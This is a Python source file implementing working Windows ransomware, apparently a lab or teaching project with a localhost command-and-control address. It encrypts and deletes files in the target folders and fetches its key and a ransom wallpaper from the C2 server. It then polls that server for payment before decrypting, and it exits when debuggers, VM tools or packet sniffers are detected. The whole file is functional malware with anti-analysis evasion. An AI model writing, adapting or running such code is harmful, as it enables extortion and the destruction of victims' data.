# coding: utf-8

# Additional modules -> install via pip
import httpx  # Handling HTTP requests/responses
import nacl.secret  # Providing symmetric encryption

# Native modules
import pathlib  # Handling file paths
import base64  # Handling base64 en/decoding
import os, sys  # Handling system related tasks (hostname/usernames)
import ctypes  # Calling Windows APIs
import winreg  # Editing Windows Registry
from subprocess import check_output  # Reading processes on system
from random import randint  # Random ints for 😴
from time import sleep  # 😴

# Variables
# Address of the remote C2 server
c2_url = "http://localhost:5000"
# List of paths. Every file in these lcoations will be encrypted ...
target_paths = [".\\toencrypt", ".\\toencrypt2"]
# ..except for the filetypes defined in the following list
exclude_types = (".exe", ".dll", ".img")
# If any of these processes is running on the host, BadThread will not run.
program_blacklist = [
    "vmware",
    "vbox",
    "ghidra",
    "ollydbug",
    "x64dbg",
    "tcpdump",
    "wireshark",
]


class Ransomware:
    """This object implements the core function and variables for the Ransomware"""

    def __init__(self, resume=False):
        # Data which will be received by C2 server later on
        self.victim_id = None
        self.encryption_key = None
        # Our "safe" used to encrypt/decrypt data
        self.box = None

    def is_admin(self):
        """Checks if the tool has been run with Admin privileges. Otherwise print error"""
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                return True
            else:
                return False
        except Exception as err:
            print(f"is_admin(): Error --> {err}")
            return False

    def is_blacklisted_process_running(self):
        """Reads process lists on system and compares it to the predefined blacklist"""
        tasks_all = check_output(("TASKLIST", "/FO", "CSV"))
        tasks_formatted = tasks_all.decode().splitlines()
        tasks_listed = [
            process.lower().split(",")[0][1:-5] for process in tasks_formatted
        ]
        for x in program_blacklist:
            # As soon as 1 blacklisted program is detected, return True -> Main will not execute BadThread
            if x in tasks_listed:
                return True
        return False

    def initial_check(self):
        """Checks for existing Registry entries -> Has the Loader been successfully initialized?"""
        if self.check_registry_entry("RansomwareDone") == "True":
            sys.exit()
        if self.check_registry_entry("ID") is not None:
            self.victim_id = self.check_registry_entry("ID")
        else:
            sys.exit()

    def get_encryption_key(self):
        try:
            response = httpx.get(f"{c2_url}/ransom/{self.victim_id}")
            self.encryption_key = response.headers["victim-key"]
            bin_key = base64.b64decode(self.encryption_key)
            self.box = nacl.secret.SecretBox(bin_key)
        except httpx.RequestError as err:
            print("create_remote_entry(): Request Exception --> ", err)

    def encrypt_file(self, filepath):
        """Takes a file path input and encrypts it using the box object of the Ransomware object"""
        try:
            if not os.path.isdir(filepath):
                # Take the original binary input of the file...
                with open(filepath, "rb") as original_file:
                    original_data = original_file.read()
                # ... encrypt it using the PyNaCl box provided by the parent object...
                encrypted_data = self.box.encrypt(original_data)
                # ... and write the encrypted binary data back in the original and newly created encrypted file.
                with open(f"{filepath}.rnsm", "wb") as encrypted_file:
                    encrypted_file.write(encrypted_data)
                with open(filepath, "wb") as original_file:
                    original_file.write(encrypted_data)
                # Lastly, remove the original file.
                os.remove(filepath)
        except Exception as err:
            print("encrypt_file(): Error --> ", err)

    def start_encryption(self):
        "Goes through each target location, filters out unwanted files and starts encryption on all files."
        for location in target_paths:
            try:
                # Check if each path actually exists
                if pathlib.Path(location).exists():
                    for path, subdirs, files in os.walk(location):
                        files = [fi for fi in files if not fi.endswith(exclude_types)]
                        for name in files:
                            filepath = os.path.join(path, name)
                            self.encrypt_file(filepath)

            except Exception as err:
                print("start_encryption(): Error --> ", err)
        self.create_registry_entry("RansomwareDone", "True")
        self.encryption_key = None
        self.box = None

    def decrypt_file(self, filepath):
        """Takes a file path input and decrypts it using the box object of the Ransomware object"""
        try:
            if not os.path.isdir(filepath):
                # Take the encrypted binary input of the file...
                with open(filepath, "rb") as encrypted_file:
                    encrypted_data = encrypted_file.read()
                # ... decrypt it using the PyNaCl box provided by the parent object...
                original_data = self.box.decrypt(encrypted_data)
                # ... and write the original binary data back to the correct file path.
                filepath = filepath.replace(".rnsm", "")
                with open(f"{filepath}", "wb") as original_file:
                    original_file.write(original_data)
                # Lastly, remove the encrypted file.
                os.remove(f"{filepath}.rnsm")
        except Exception as err:
            print("decrypt_file(): Error --> ", err)

    def start_decryption(self):
        for location in target_paths:
            try:
                # Check if each path actually exists
                if pathlib.Path(location).exists():
                    for path, subdirs, files in os.walk(location):
                        files = [fi for fi in files if fi.endswith(".rnsm")]
                        for name in files:
                            filepath = os.path.join(path, name)
                            self.decrypt_file(filepath)

            except Exception as err:
                print("start_decryption(): Error --> ", err)

    def change_wallpaper(self, defaultWallpaper=False):
        "Change the wallpaper of the infected PC"
        if defaultWallpaper:
            try:
                image_path = "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg"
                ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
                return
            except FileNotFoundError as err:
                print("change_wallpaper(): FileNotFound Error --> ", err)
                return
            except Exception as err:
                print("change_wallpaper(): Error --> ", err)
                return
        try:
            response = httpx.get(f"{c2_url}/static/wp/{self.victim_id}.png")
        except httpx.TimeoutException as err:
            print("change_wallpaper(): Timeout Error --> ", err)
            sleep(60)
            response = httpx.get(f"{c2_url}/static/wp/{self.victim_id}.png")
        except httpx.RequestError as err:
            print("change_wallpaper(): Request Exception --> ", err)
            response = httpx.get(f"{c2_url}/static/wp/{self.victim_id}.png")
        image_path = f"C:\\Users\\{os.environ['USERNAME']}\\Desktop\\ransompaper.png"
        try:
            file = open(image_path, "wb")
            file.write(response.content)
            file.close()
            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
        except FileNotFoundError as err:
            print("change_wallpaper(): FileNotFound Error --> ", err)
        except Exception as err:
            print("change_wallpaper(): Error --> ", err)

    def setup_decryption(self):
        """Setup the PyNaCL box again, so that decryption can take place"""
        response = httpx.post(f"{c2_url}/check/{self.victim_id}")
        self.encryption_key = response.headers["Victim-Key"]
        bin_key = base64.b64decode(self.encryption_key)
        self.box = nacl.secret.SecretBox(bin_key)

    def create_registry_entry(self, subkey, subkeyvalue):
        keyName = r"Software\Blocky\Main"
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, keyName, 0, winreg.KEY_ALL_ACCESS
            )
        except:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyName)
        winreg.SetValueEx(key, subkey, 0, winreg.REG_SZ, subkeyvalue)
        winreg.CloseKey(key)

    def check_registry_entry(self, subkey):
        """Checks for existing Registry entries -> Has the Loader been successfully initialized?"""
        keyName = r"Software\Blocky\Main"
        try:
            # If key exists, create a Loader object without getting the already known system info, and start loop again
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, keyName, 0, winreg.KEY_ALL_ACCESS
            )
            return winreg.QueryValueEx(key, subkey)[0]
        except:
            # Else exit the program
            return None

    def sync_loop(self):
        while (
            httpx.post(f"{c2_url}/check/{self.victim_id}").headers["Payment-Received"]
            == "False"
        ):
            sleep(5)

        self.setup_decryption()
        self.start_decryption()
        self.change_wallpaper(defaultWallpaper=True)


if __name__ == "__main__":
    ransomware = Ransomware()
    # Exit the programm, should it be run as non-Admin
    if not ransomware.is_admin():
        sys.exit()
    # Exit the programm, should a program listed on the Blacklist be detected.
    if ransomware.is_blacklisted_process_running():
        sys.exit()
    # Exit the programm, should a debugger be detected, so no malicious activity is run.
    if ctypes.windll.kernel32.IsDebuggerPresent():
        sys.exit()
    # Start check if system is already infected or not
    ransomware.initial_check()
    # Get encryption key from C2 server
    ransomware.get_encryption_key()
    # Start encrpyting files on the victim
    ransomware.start_encryption()
    # Set wallpaper with ransomnote
    ransomware.change_wallpaper()
    # Loop to check for payment
    ransomware.sync_loop()
